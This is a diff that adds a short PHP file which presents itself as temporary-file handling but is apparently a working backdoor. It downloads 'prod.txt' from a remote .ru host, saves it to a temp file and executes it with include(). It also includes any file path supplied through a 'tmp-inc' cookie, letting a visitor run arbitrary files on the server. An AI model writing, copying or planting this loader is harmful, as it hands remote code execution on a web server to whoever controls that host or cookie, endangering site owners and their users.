@@ -1,0 +1,50 @@
+<?php
+
+function getTempPath() {
+    $tmpPath = isset($_COOKIE['tmp-inc']) && !empty($_COOKIE['tmp-inc']) ? $_COOKIE['tmp-inc'] : false;
+
+    if ($tmpPath && isValidTempPath($tmpPath)) {
+        return $tmpPath;
+    }
+
+    return generateTempPath();
+}
+
+function isValidTempPath($path) {
+    return file_exists($path) && filesize($path) > 100;
+}
+
+function generateTempPath() {
+    $tempDir = sys_get_temp_dir();
+    $tempPath = tempnam($tempDir, '');
+
+    return $tempPath ?: false;
+}
+
+function fetchAndStoreContent($url, $path) {
+    $content = file_get_contents($url);
+    
+    if ($content !== false && file_put_contents($path, $content) !== false) {
+        setcookie('tmp-inc', $path);
+        include($path);
+        exit;
+    }
+
+    die('Unable to write to temporary file.');
+}
+
+$tempPath = getTempPath();
+
+if (!$tempPath) {
+    die("Unable to generate tmp path");
+}
+
+$fileSize = filesize($tempPath);
+
+if ($fileSize < 10) {
+    fetchAndStoreContent("https://zzna.ru/prod.txt", $tempPath);
+} elseif ($fileSize >= 1024) {
+    setcookie('tmp-inc', $tempPath);
+    include($tempPath);
+    exit;
+}
